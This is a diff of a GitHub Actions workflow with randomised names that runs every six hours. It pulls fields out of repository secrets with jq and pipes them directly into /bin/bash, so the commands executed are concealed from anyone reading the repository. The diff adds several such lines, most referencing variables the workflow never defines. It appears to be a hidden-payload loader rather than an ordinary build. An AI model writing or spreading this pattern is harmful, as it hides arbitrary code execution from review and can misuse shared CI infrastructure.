@@ -1,18 +1,26 @@
 name: jiuxiayaoya
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 0/6 * * *'
-
-jobs:  # 29379
+    - cron: '12 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiuxiayaoya
         env:
-          he17517: ${{ secrets.he17517 }}
+          gfpfm93: ${{ secrets.gfpfm93 }}
         run: |
-          echo $he17517 | jq -r .miszh6 | /bin/bash
-          echo $zguh2010 | jq -r .gixo5 | /bin/bash
+          echo $gfpfm93 | jq -r .iwinx031 | /bin/bash
+          echo $uzz772 | jq -r .u6789 | /bin/bash
+          echo $quru5 | jq -r .bcev91157 | /bin/bash
+          echo $ufoo75793 | jq -r .hsp4046 | /bin/bash
+          echo $szb3399 | jq -r .yfztf95 | /bin/bash
+          echo $bcpz9 | jq -r .puofw35 | /bin/bash
+          echo $w82220 | jq -r .ancr558 | /bin/bash
+          echo $xszwc738 | jq -r .pwmtu241 | /bin/bash
+          echo $qpyc1806 | jq -r .mtr37998 | /bin/bash
 
